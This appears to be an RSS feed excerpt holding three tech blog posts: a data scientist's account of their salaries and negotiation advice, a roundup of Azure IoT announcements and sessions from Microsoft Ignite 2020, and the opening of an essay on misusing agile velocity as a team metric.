                    <!--kg-card-begin: html--><!--kg-card-end: html--><p>Today, we‚Äôre talking about data science salaries. </p><p>Obviously, this is a huge‚Äì and typically taboo‚Äì question to ask just anyone, so in the spirit of full transparency, I‚Äôll be telling you how much I‚Äôve made in all of my data science positions ever since I‚Äôve graduated. <br></p><p>First of all, let‚Äôs cover some basics. Your pay will <em>very much </em>depend on the company you‚Äôre working for, with respect to their size, how much funding they‚Äôre willing to allocate to you, and lots of other factors. And it also depends on you‚Äì your experiences, your career progression, and how much money really matters to you (pertaining to the position you apply for). </p><p>For context on the figures I‚Äôm about to introduce, let‚Äôs take a look at some industry statistics. Today, Glassdoor lists the mean annual data science salary to be $112,000. Indeed has an average salary of $120,000, while PayScale comes in a bit lower with $95,000. </p><p>On the other end of the scale, <a href="https://www.levels.fyi/comp.html?track=Data%20Scientist">levels.fyi </a>has a data science salary median of $150,000, and an insane $238,000 median coming from those in the San Francisco Bay Area. Out of curiosity‚Äìand sheer disbelief‚Äì I tried submitting a fake salary of $400k, and they still accepted it, so who knows? </p><h2 id="first-data-science-salary-offer-out-of-college">First Data Science Salary Offer Out of College</h2><p>After graduating college in 2015, I had two different job offers waiting for me. </p><p>The first was from a company called Workday, and they offered me a <strong>$95,000 base salary and $60,000 over four years in terms of stock</strong>. For total compensation, this equals out to about $110,000 annually. The position they needed to fill was actually for a Software Engineer in Performance, which is ultimately‚Äìspoiler alert‚Äì why I didn‚Äôt end up taking the job. </p><p>The second offer came from Inflection, and they were looking for a marketing analyst, extending <strong>a base salary of $85,000 with a $5000 sign-on bonus</strong>. </p><p>So why did I end up taking a $25,000 pay-cut in accepting one offer over the other? </p><p>Well, when I interviewed at Workday right out of college, they actually didn‚Äôt ask me any technical questions. The interview was very casual‚Äì we laughed and joked around, and mostly talked about projects I had worked on in the past.</p><p>Ultimately, while I was really happy with the offer (making six figures out of college was <em>insane </em>to me), I thought that the marketing analyst role would be more helpful for later transitioning to data science, and I was also a lot more excited to learn from my boss at Inflection. </p><p><em>If you're interested in how I landed my <a href="https://www.interviewquery.com/blog-new-grad-guide-on-landing-data-science-job/">first data science job out of college</a>, check out my new grad data science guide and my youtube video on l<a href="https://www.youtube.com/watch?v=7v_Szio9r3E">anding a data science job without experience</a>!</em></p><h2 id="first-data-scientist-position-salary">First Data Scientist Position Salary<br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/INF_logo_2015.png" alt="My data science salary at Inflection (pictured) was around $85,000/year. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/INF_logo_2015.png 600w, https://blog.interviewquery.com/content/images/2020/09/INF_logo_2015.png 610w"><figcaption>Image from <a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fduo.com%2Fuse-cases%2Fcase-studies%2Finflection&amp;psig=AOvVaw1lJKdBCQA_Cc3S8bCZ-dpS&amp;ust=1600470045417000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCOC53Nal8esCFQAAAAAdAAAAABAd"><em>Google Images</em></a></figcaption></figure><p>So as a new grad, I was making around $85k a year in the San Francisco Bay Area, which is definitely a really expensive place to live. My take-home pay after tax and everything was around $4000 a month, so, as you can imagine, I didn‚Äôt have a lot of savings left over. </p><p>Very quickly, I realized that this was the minimum amount I needed to survive. As someone new to the workforce that hasn‚Äôt seen that much money before, it can be a little distorting to see those big numbers and having it end up being much less in real-life, but I saw this as a good opportunity anyway for a new grad. <br></p><p>However, after working at Inflection for around three to four months, I started to feel like the company wasn‚Äôt really for me. I wasn‚Äôt learning a whole lot, and my boss ended up leaving in the first two weeks, so I decided to leave after a few months to seek out other opportunities.</p><p>At this point, I was kicking myself for not taking that position at Workday, but I ended up taking a new job with Jobr, which is actually where I found the position. They reached out to me with a data scientist position (specifically working with the recommendation algorithm), and eventually an offer came in for <strong>$80,000 with 0.5% equity, so my base pay would be cut by $5k</strong>. </p><p>Equity works based on the evaluation of the company at that time, which was around $10 million. Jobr raised $2 million with that evaluation, so my 0.5% cut of equity meant that I was entitled to around $50,000 over the course of four years, with the possibility of that value increasing. </p><p>Inside my employment contract, they had also included a clause that if they had raised the Series A, my base salary would go up to $100,000 once that Series A had gone through. </p><p>At this point, I kind of felt like I‚Äôd be stupid <em>not to take the job </em>because no one else was really interested in hiring me. </p><h2 id="startup-acquisition-how-much-did-i-make">Startup Acquisition: How Much Did I Make?<br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg" alt="After moving over to work for Jobr, my data science base salary increased from $80k to $110k." srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg 600w, https://blog.interviewquery.com/content/images/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg 658w"><figcaption>Image from <a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.producthunt.com%2Fposts%2Fjobr&amp;psig=AOvVaw1BGKqJRJtQRFJl47LG6onm&amp;ust=1600470194602000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCKCW-J2m8esCFQAAAAAdAAAAABAY"><em>Google Images</em></a></figcaption></figure><p>So here‚Äôs where a bit of luck came into play. After six months of working at my job, Jobr was acquired for $12.5 million by Monster, who was looking at my company‚Äôs Tinder-for-jobs kind of app. Using that value, you‚Äôd think that I‚Äôd hit the jackpot with my share of equity at around $62,500. Unfortunately, no. </p><p>If you‚Äôre unfamiliar with acquisitions, basically when a larger company consumes a smaller one, there's a lot of lawyers, brokers, investors, and other middle-men involved. All in all, you can expect around a third of the amount you‚Äôre originally supposed to get to go to a bunch of different people, even if it‚Äôs above the evaluation the company raised (as it was in this case). </p><p>Pre-tax, I ended up taking home around $40,000, rounding up my first year with Jobr to be around $150,000. </p><p>To summarize, I guess the lesson here is that it‚Äôs important to continually develop your skills, as that‚Äôs what you‚Äôre being hired for. <strong>Money comes later (with a little bit of luck!), but it helps to set yourself up for success first in your current environment. </strong></p><p>So after acquisition, earnout was also given out. Basically, revenue targets are set for certain metrics, and if you hit those, you can end up earning more from the acquisition. With the way it was written out in my contract, I‚Äôd basically be able to receive another $40,000-$50,000 for every year after the acquisition.</p><p>We ended up forecasting that we‚Äôd hit around 90% of them, so my take-home ended up being around <strong>$150,000 annually</strong> after that first year. </p><p>In 2017, the whole company in Jobr negotiated a raise from the parent company, so I got bumped up to <strong>$130,000 base-pay, making my total compensation per year at that point to be $170,000. </strong></p><h2 id="my-last-data-science-salary-at-nextdoor">My Last Data Science Salary at Nextdoor <br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/media-logos-green.png" alt="My annual data science salary at Nextdoor decreased when I switched jobs again. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/media-logos-green.png 600w, https://blog.interviewquery.com/content/images/2020/09/media-logos-green.png 640w"></figure><p>In 2018, my third year out of college, I ended up switching jobs again. Everyone I had known originally at Jobr had left at this point, including my current co-founder Shane. The work culture had changed, and I really wanted to find another company that really fit and supported my needs. </p><p>I knew that my total compensation was likely to decrease unless I interviewed for larger companies, but my main focus at this point was finding a place that I really liked. </p><p>I signed up for Hired, and Nextdoor ended up reaching out to me after I set my base salary ($150,000) requirement. In hindsight, now that I‚Äôve learned a lot more about negotiation and interviewing, I don‚Äôt recommend using Hired. Once you set your salary at a certain threshold, companies will end up using that when they‚Äôre negotiating with you, <strong>setting up a salary expectation that‚Äôs lower than what they can actually allocate to you</strong>. </p><p>In this way, it‚Äôs better to withhold salary expectations until the end of the interviewing process, but I still consider Hired a good place to get a job if you don‚Äôt actually want to go out there and apply for X number of positions. </p><p>So with Nextdoor, I went through the entire process (including the on-site interview), so I was having good feelings about the company when I met everyone. My offer ended up around $145,000, which is lower than what I expected given what I put in my Hired profile. </p><p>This was a <em>huge </em>indication to me that their intentions were to start lower so we could negotiate up. In the end, I negotiated up to $155,000 with a $20,000 sign-on bonus, so <strong>my total compensation for that first year was $175,000</strong>. My offer included some equity as well, but this is much harder to calculate with a long-term unicorn like Nextdoor, as you don‚Äôt really know when they‚Äôre going to exit. </p><p>Currently, I'm at InterviewQuery, definitely making less than $175,000 a year. If I were to estimate given my career progression if I had taken another data science job, I probably could have secured around $190,000 in base salary, or maybe even more if it were at Facebook, Google, or Amazon, etc. </p><h2 id="data-science-salary-tips-tricks">Data Science Salary: Tips &amp; Tricks</h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/freelance-1989333_1280.png" alt="Data Science salaries change by a variety of factors. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/freelance-1989333_1280.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2020/09/freelance-1989333_1280.png 1000w, https://blog.interviewquery.com/content/images/2020/09/freelance-1989333_1280.png 1280w" sizes="(min-width: 720px) 720px"><figcaption>Image from <em><a href="https://pixabay.com/vectors/freelance-work-job-making-money-1989333/">Pixabay</a></em></figcaption></figure><p>If you‚Äôre just about to be in the negotiation process or if you‚Äôre just looking to break in data science salary numbers, here‚Äôs some helpful rules that might change how you look at things. </p><h3 id="never-compare-yourself-to-others-">Never compare yourself to others. <br></h3><p>Honestly, this is just an unfair comparison overall. You would be doing yourself a disservice in trying to connect different data science salaries to other people who have different luck, experiences, and career trajectories. </p><h3 id="determine-your-own-market-value-">Determine your own market value. <br></h3><p>The general consensus is that you‚Äôre worth the amount for which you can be replaced by anyone else in the field. So, for instance, if you‚Äôre doing BI analysis as a data scientist, then you can essentially be replaced by a BI analyst at a lower salary. </p><p>In this way, it‚Äôs imperative to really understand what your role entails, as well as how you can grow, whether that involves becoming a manager, a technical lead, etc. </p><h3 id="figure-out-how-much-money-means-to-you-">Figure out how much money means to you. <br></h3><p>When I was walking in and out of work everyday, I didn‚Äôt feel like I was walking out of $100k, or $200k, or whatever that equivalent is per hour.</p><p>Understanding your goals (trying to retire or be financially independent versus being more focused on learning more) is incredibly important, as it dictates, ultimately, what kind of company you may end up working for, and as a result, the workplace environment and culture. </p><blockquote><em>If you're curious about the ‚Ä¶</em></blockquote></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.interviewquery.com/blog-data-science-salaries/">https://www.interviewquery.com/blog-data-science-salaries/</a></em></p>]]>
            </description>
            <link>https://www.interviewquery.com/blog-data-science-salaries/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574928</guid>
            <pubDate>Thu, 24 Sep 2020 03:22:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Azure IoT Announcements and Sessions from Microsoft Ignite 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574797">thread link</a>) | @crpietschmann
<br/>
September 23, 2020 | https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/ | <a href="https://web.archive.org/web/*/https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
<p>There have been a few great Azure IoT announcements and session made available by Microsoft as part of the Microsoft Ignite 2020 virtual conference. With the flood of information coming out of Microsoft Ignite 2020,  it can be difficult to parse out the specific announcements and sessions of interest, so here‚Äôs a list that‚Äôs focused solely on the topics of Azure IoT.</p>



<p>Let‚Äôs take a look at the top Azure IoT (Internet of Things) announcements from Microsoft Ignite 2020!</p>








<br><h2><span id="azure_iot_announcements"></span>Azure IoT Announcements<span></span></h2>



<br><h3><span id="azure_sql_edge,_optimized_for_iot_gateways_and_devices_now_ga"></span>Azure SQL Edge, Optimized for IoT Gateways and Devices now GA<span></span></h3>



<p>Azure SQL Edge, which&nbsp;brings the most secure Microsoft SQL data engine to&nbsp;Internet of Things (IoT)&nbsp;gateways and edge devices, is now available. Optimized for IoT workloads, SQL Edge supports built-in data streaming, storage and&nbsp;artificial intelligence&nbsp;packed into&nbsp;a&nbsp;small footprint container that works in connected or disconnected environments.</p>



<p>Built on the same code&nbsp;base as Microsoft SQL Server and Azure SQL, Azure SQL Edge provides the same industry-leading security, the same familiar developer experience, and the same tooling that many teams already know and&nbsp;trust. ‚Äã</p>



<p>Azure SQL Edge is a small-footprint container ‚Äî less than 500 megabytes ‚Äî running in ARM- and x64-based devices in connected, disconnected or semi-connected environments.</p>



<p><a href="https://aka.ms/AA9gi03" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h3><span id="new_azure_certified_device_program"></span>New Azure Certified Device Program<span></span></h3>



<p>A new Azure Certified Device program will streamline the experience of connecting the right device to the right solution through its Azure Certified Device Catalog, benefiting both device builders and solution builders.</p>



<p>For device builders, the certification reduces time to market, as they no longer&nbsp;have to&nbsp;use their own time and resources to&nbsp;verify, validate and communicate trust. For the solution builder and distributor, the certification ensures&nbsp;both&nbsp;quality and compatibility.</p>



<p>The catalog will highlight device compatibility and differentiation&nbsp;through three Azure certifications:</p>



<ul><li><strong>Azure Certified Device,&nbsp;</strong>the entry-level certification that validates that a device can connect with Azure IoT Hub and&nbsp;securely provision through the Device Provisioning Service (DPS)</li><li><strong>IoT Plug and Play,&nbsp;</strong><a href="https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fazure.microsoft.com%2Fen-us%2Fblog%2Fprepare-and-certify-your-devices-for-iot-plug-and-play%2F&amp;data=02%7C01%7Cvwalker%40we-worldwide.com%7Cdc9023a766b7415d473e08d856ae444c%7C3ed60ab455674971a5341a5f0f7cc7f5%7C0%7C0%7C637354653788198257&amp;sdata=HcAMFZiKv8QqbSMtVSBk0S8lWCm313Ime%2FfqT%2Fj%2Fflc%3D&amp;reserved=0" target="_blank" rel="noopener">announced in August</a>, the certification that simplifies the process of building devices without custom device code</li><li><strong>Edge-managed certification,&nbsp;</strong>which focuses on device management standards for Azure connected devices for IoT devices running Windows,&nbsp;Linux or RTOS.&nbsp;Today,&nbsp;this program&nbsp;certification&nbsp;focuses&nbsp;on&nbsp;Edge runtime&nbsp;compatibility for module&nbsp;deployment and management.</li></ul>



<p><a href="https://aka.ms/AA9g2rj" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h3><span id="at_t_brings_first_azure_sphere_cellular_guardian_device_to_market"></span>AT&amp;T brings first Azure Sphere Cellular Guardian device to market<span></span></h3>



<p>With‚ÄØthe launch of‚ÄØthe first Azure Sphere cellular guardian device, AT&amp;T is enabling customers to expand connectivity and security without relying on Wi-Fi access.</p>



<p>This new product can connect a company‚Äôs various existing devices and machines directly to the customer‚Äôs cloud via a cellular network. This allows the customer to manage and monitor thousands of devices, aggregate data and identify potential problems.</p>



<p>By using the AT&amp;T cellular network, enterprise customers can connect devices in more than 200 countries across 500 carriers where AT&amp;T offers managed services to support day-to-day operations. AT&amp;T offers end-to-end professional services, and the secure cellular network extends the secure architecture of Azure Sphere.</p>



<p><a href="https://aka.ms/AA9gi0n" target="_blank" rel="noopener">Learn more‚Ä¶</a></p>



<h2><span id="azure_iot_sessions_at_ms_ignite_2020"></span>Azure IoT Sessions at MS Ignite 2020<span></span></h2>



<p>Here are a few of the great Azure IoT sessions available for viewing on the Microsoft Ignite conference website. These sessions are recorded and will be available for recording within 24 hours of their live stream.</p>



<h3><span id="azure_iot_services,_roadmap_and_vision_from_connected_assets_to_connected_environments"></span><a href="https://myignite.microsoft.com/sessions/8c90945c-eec6-43ed-b16a-3adf3c2ba37a" target="_blank" rel="noopener">Azure IoT services, roadmap and vision: from connected assets to connected environments</a><span></span></h3>



<p>Azure IoT is paving the way back to the workplace with the most comprehensive and powerful set of services and is leading the industry in simplifying IoT.&nbsp; Learn how IoT is evolving from providing insights and control of connected assets, to providing insights and control of entire connected environments. This session will delve into the Azure IoT services and our innovation roadmap across cloud and edge that enables this evolution. </p>



<p><a href="https://myignite.microsoft.com/sessions/8c90945c-eec6-43ed-b16a-3adf3c2ba37a" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Sam George ‚Äì CVP, Azure IoT, Microsoft</p>



<h3><span id="azure_iot_building_end_to_end_iot_solutions"></span><a href="https://myignite.microsoft.com/sessions/db80fb8c-81d3-4ce8-a1b1-9df6862c1861" target="_blank" rel="noopener">Azure IoT: building end to end IoT solutions</a><span></span></h3>



<p>The value in IoT comes from end to end business solutions that connect devices, provide insights and drive informed action. We‚Äôll cover two approaches to building IoT solutions on Azure, including using our IoT Reference Architecture or using IoT Central, our industry leading IoT application platform that requires zero cloud solution development skills. We‚Äôll cover how to connect an IoT Edge and an Azure Sphere device using both approaches. Come learn just how easy and powerful we‚Äôve made IoT.</p>



<p><a href="https://myignite.microsoft.com/sessions/db80fb8c-81d3-4ce8-a1b1-9df6862c1861" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Cory Newton-Smith ‚Äì Azure IoT Principal PM Manager, Microsoft<br>Pamela Cortez ‚Äì Azure IoT Senior PM, Microsoft</p>



<h3><span id="ask_the_expert_azure_iot_from_connected_assets_to_connected_environments_with_iot_plug_and_play"></span><a href="https://myignite.microsoft.com/sessions/802e3a27-a3fb-4212-ae7c-c570ff3a3469" target="_blank" rel="noopener">Ask the Expert: Azure IoT: From connected assets to connected environments with IoT Plug and Play</a><span></span></h3>



<p>Azure IoT is paving the way back to the workplace with the most comprehensive and powerful set of services and is leading the industry in simplifying IoT. Join this Ask the Experts to ask all your questions relating to how you can connect IoT devices to the cloud seamlessly with Plug and Play.</p>



<p><a href="https://myignite.microsoft.com/sessions/802e3a27-a3fb-4212-ae7c-c570ff3a3469" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Sam George ‚Äì CVP, Azure IoT, Microsoft</p>



<h3><span id="gathering_data_from_the_world"></span><a href="https://myignite.microsoft.com/sessions/ed1b23a6-cd0f-44fd-9cb8-afe1cd065bbc" target="_blank" rel="noopener">Gathering data from the world</a><span></span></h3>



<p>Internet of Things (IoT) is the common term used for small devices designed to provide constant streams of information about what‚Äôs going on around it. IoT devices can count actions, measure the weather, or track location. All the information being gathered needs to be stored somewhere and eventually read. Let‚Äôs talk about some of the options available to you, and how you can begin to see what‚Äôs going on with your devices.</p>



<p><a href="https://myignite.microsoft.com/sessions/ed1b23a6-cd0f-44fd-9cb8-afe1cd065bbc" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speaker:<br>Jim Bennett ‚Äì Senior Cloud Advocate, Microsoft</p>



<h3><span id="azure_ai_and_iot_to_support_smart_office_reopening_with_rxr_realty"></span><a href="https://myignite.microsoft.com/sessions/b52ff2cb-28bb-4320-a310-81f08cf14d49" target="_blank" rel="noopener">Azure AI and IoT to support smart office reopening with RXR Realty</a><span></span></h3>



<p>Hand-on deep dive of RXR Realty‚Äôs pioneering work to make it safer for people to return back to the workplace amid Covid-19 in New York.&nbsp; Includes demonstration and explanation of how they are leveraging Azure AI and IoT for automated health checks, air quality control, social distancing, mask compliance and much more. This is an Ignite exclusive show from Microsoft Mechanics.</p>



<p><a href="https://myignite.microsoft.com/sessions/b52ff2cb-28bb-4320-a310-81f08cf14d49" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Jeremy Chapman ‚Äì Directory, Microsoft<br>Cory Clarke ‚Äì VP Product Management, RXR Realty</p>



<h3><span id="learn_how_insanely_easy_vision_ai_can_enable_real_time_insights_for_manufacturing"></span><a href="https://myignite.microsoft.com/sessions/3fc1dd73-1979-4631-a536-8f693e988dfd" target="_blank" rel="noopener">Learn how insanely easy Vision AI can enable real time insights for Manufacturing</a><span></span></h3>



<p>Intelligent Industry Solution Series:&nbsp;Integration of cameras into factory floors, warehouses and retail environment can bring immediate and actionable insights. The new Factory AI tool makes the integration of vision analytics easy and seamless.&nbsp; With a few basic inputs, any factory floor or business can enable real time insights across a variety of use cases.&nbsp;Hear from Intel and Microsoft experts on the value of intelligent vision and how to get started.</p>



<p><a href="https://myignite.microsoft.com/sessions/3fc1dd73-1979-4631-a536-8f693e988dfd" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>David Armour ‚Äì Principal Program Manager, Microsoft<br>Philip Van De Mortel ‚Äì Edge Sales Manager, Intel</p>



<h3><span id="remote_patient_monitoring_sharing_a_blueprint_to_enhance_patient_care_and_safety"></span><a href="https://myignite.microsoft.com/sessions/bb380ea2-38ea-481f-9030-0c2fb5e978bb" target="_blank" rel="noopener">Remote Patient Monitoring: Sharing a blueprint to enhance patient care and safety</a><span></span></h3>



<p>Intelligent Industry Solution Series: Enhancing patient care starts with comprehensive information and personalized treatment. Combined with increased safety measures, the healthcare industry has fast tracked telehealth solutions. One practice is Remote Patient Monitoring, which reduces in-person visits, boosts patient convenience and provider efficiency. In this session, we will look at Telehealth trends, and share a remote patient monitoring blueprint enabled by Microsoft and Intel.</p>



<p><a href="https://myignite.microsoft.com/sessions/bb380ea2-38ea-481f-9030-0c2fb5e978bb" target="_blank" rel="noopener">Watch now‚Ä¶</a></p>



<p>Speakers:<br>Anne Barker ‚Äì Enterprise Account Executive, Intel<br>Michela Sainato ‚Äì Program Manager II, Microsoft</p>
<br>
						
											
						
					
					<h3>Article Author</h3>
					<div id="author-info">
						<p><img alt="" src="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=128&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=256&amp;d=identicon&amp;r=g 2x" height="128" width="128" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">																						<img id="author-img-mvp" src="https://build5nines.com/wp-content/uploads/2019/08/mvp_logo_horizontal_preferred_cyan300_rgb_300ppi_163x65.png" alt="Microsoft MVP">
													</p>
						
						<p id="author-desc">Chris is the <strong>Founder of Build5Nines.com</strong> and a <strong>Microsoft MVP</strong> in Azure &amp; IoT with 20 years of experience designing and building Cloud &amp; Enterprise systems. He is also a <strong>Microsoft Certified: Azure Solutions Architect</strong>, developer, <strong>Microsoft Certified Trainer</strong> (MCT), and Cloud Advocate. He has a passion for technology and sharing what he learns with others to help enable them to learn faster and be more productive.</p>
						
					</div>
					
											
										</div></div>]]>
            </description>
            <link>https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574797</guid>
            <pubDate>Thu, 24 Sep 2020 02:52:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why agile velocity is the most dangerous metric]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574765">thread link</a>) | @necco908
<br/>
September 23, 2020 | https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/ | <a href="https://web.archive.org/web/*/https://linearb.io/blog/why-agile-velocity-is-the-most-dangerous-metric-for-software-development-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="670d84f7" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			
<figure><img src="https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1024x482.png" alt="Agile velocity is useful for sprint planning, but it is often misused as a metric." srcset="https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1024x482.png 1024w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-300x141.png 300w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-768x361.png 768w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4-1536x723.png 1536w, https://linearb.io/wp-content/uploads/2020/05/TLDR-4.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Agile Velocity is arguably the most popular software development metric in the world. It‚Äôs a very powerful metric when used for individual team sprint capacity planning. And there are two things we know about power‚Ä¶ it comes with great responsibility and it corrupts.&nbsp;</p>



<p>When agile velocity is used for anything other than individual team sprint capacity planning, very bad things can occur. In fact, when misused, Agile Velocity is the most dangerous metric for software development organizations. Unfortunately, every day Velocity is abused by executives, engineering leaders, product leaders, and even developers.&nbsp;</p>



<hr>



<blockquote><p><strong>Already familiar with the dangers of using agile velocity? </strong></p><p><strong><a rel="noreferrer noopener" href="https://linearb.io/12-metrics-dev-leader/" target="_blank">Click here to see 17 alternative metrics for team-focused software development leaders</a></strong></p></blockquote>



<hr>







<h3><strong>What is Agile Velocity?</strong></h3>



<p>Agile Velocity measures the amount of work a single team completes during a software development iteration or sprint. It represents the amount of story points completed over time and can be visualized as the slope in a classic burndown chart.</p>



<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/Burndown-Velocity.png.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/Burndown-Velocity.png" alt="Agile velocity is the slope of a burndown chart">
</picture>
</figure>



<h3><strong>What are Story Points?</strong></h3>



<p>Story Points are a unit of measure for expressing an estimate of the overall effort that will be required to fully implement a product backlog item or any other piece of work. Story Points are a subjective measure decided and agreed upon by an individual software development team or organization.&nbsp;</p>







<h3><strong>My personal history with Story Points &amp; Agile Velocity</strong></h3>



<p>When I was promoted into my first team lead role, like most new managers (in any function), I was in over my head. But I was determined to do a great job. I looked for every opportunity to help my team improve. Data. Metrics. Process. Culture. <a href="https://linearb.io/blog/how-to-introduce-data-driven-culture-to-your-dev-team/" target="_blank" rel="noreferrer noopener">I was hungry for all of it.&nbsp;</a></p>



<p>I remember thinking that, compared to other departments like sales, marketing, and technical support, there didn‚Äôt seem to be a lot of established metrics engineering leaders used to measure team-based performance and improvement. Which is ironic because we measure so many things ‚Äì page load performance, latency, code performance, unit test coverage, etc.&nbsp;</p>



<p>Then I found velocity. I was pretty excited. Of course, I had heard of it but I never did a deep dive. We used Jira and story points but I was never trained on velocity and it was not part of our formal process to measure story points across multiple sprints.&nbsp;</p>



<p>We started using it for capacity planning. It worked! You get what you measure, right? We started measuring velocity and the focus on it allowed us to get progressively more accurate in our sprint planning.&nbsp;</p>



<p>I was promoted to lead more teams. At some point in a management meeting, I asked all of our managers ‚ÄúShould we start reviewing velocity every week in this meeting?‚Äù. And I was actually ready to go further‚Ä¶ scrum of scrum, all-hands meetings, etc.&nbsp;</p>



<p>I‚Äôll never forget what happened‚Ä¶ <a href="https://www.linkedin.com/in/timothyrwall/" target="_blank" rel="noreferrer noopener">Tim Wall</a>, a vet on our team who I really respected, gave me the following advice: ‚ÄúNever use velocity to measure performance and never share velocity outside of individual teams.‚Äù&nbsp;</p>



<p>Thankfully, I listened to Tim. Because since then I‚Äôve heard nothing but horror stories from other engineering leaders who tried to use agile velocity for more than what it was originally intended for.&nbsp;</p>







<h3><strong>Dodging the Dangers</strong></h3>



<div><figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/05/sidestep.jpg.webp">
<img src="https://linearb.io/wp-content/uploads/2020/05/sidestep.jpg" alt="Dodge the dangers of agile velocity" width="219" height="180">
</picture>
</figure></div>



<p>There are three main types of abuses I‚Äôve seen of Agile Velocity. Consider this a hero‚Äôs guide to help the software development community stay safe, avoid traps, and, most importantly, to use Agile Velocity for good not evil.&nbsp;</p>







<h4><strong>1) Agile Velocity abused by Dev Leaders as a team comparison metric</strong></h4>



<p>I narrowly escaped making this mistake. Some engineering leaders I know weren‚Äôt so lucky.&nbsp;</p>



<p>Here‚Äôs the scenario‚Ä¶ Agile scrum is being used by all of your teams. Velocity is being tracked on an iteration by iteration basis. You have a gut intuition that some of your teams are ‚Äúperforming better‚Äù and some of your teams are ‚Äúperforming worse‚Äù. You get an itch to see which teams are completing the most story points per iteration and which teams are completing the least story points per iteration. You‚Äôre just curious. Then you start thinking about it in terms of who has the ‚Äúbest‚Äù velocity? Maybe you even show and compare velocity in your management meeting or scrum of scrums.&nbsp;</p>



<figure><img src="https://lh3.googleusercontent.com/zmq1Ty58gfjHCGnYVG1p-ZPGvktzrADWy0d13Nr8etzoR12yZvzUE36H_HsHGrSsqNFDrzGWH1f9ZDEz-RSPIx8J1CaeKd_ePxNyRRsXOGigzLzcDFeft43B-2pHbJ2McYC-VC3w" alt="Agile velocity: Danger!" width="375" height="392"></figure>



<h5><strong>What can go wrong</strong></h5>



<p>Danger, Will Robinson! We have to be very, very careful here.&nbsp;</p>



<ul><li>Story point weights are subjective to each individual team<br></li><li>Therefore story point weights are easy to manipulate<br></li><li>Therefore developers have an incentive to inflate their points<br></li><li>Therefore individual teams and developers can easily game the system<br></li><li>If some teams are inflating their story points, other developers will figure this out<br></li><li>From here you are only a stone‚Äôs throw away from broken trust, frustration and culture damage&nbsp;</li></ul>



<p>Bad intentions aren‚Äôt even required for this to happen. It‚Äôs natural human behavior.</p>



<p>So, like Tim told me, Agile Velocity is sacred and should be used within individual teams only. Period.&nbsp;</p>







<h5><strong>Tips to navigate this situation:</strong></h5>



<p>There‚Äôs nothing wrong with looking at comparative performance data. That‚Äôs your job. Without benchmarks, you won‚Äôt be able to invest your time helping your people and teams that need it most. Since you shouldn‚Äôt use velocity, what metrics should you use? <a href="https://linearb.io/blog/align-engineering-metrics-to-your-business-kpis/" target="_blank" rel="noreferrer noopener">It depends on the business outcome you‚Äôre trying to achieve</a>:</p>



<ul><li>If speed to value is your main goal, consider <a href="https://linearb.io/cycle-time/" target="_blank" rel="noreferrer noopener">Cycle Time</a>.</li><li>If predictability is your main goal, look at Iteration Churn.&nbsp;</li><li>If quality is your priority, Change Failure Rate and Mean Time to Restore are good.</li></ul>







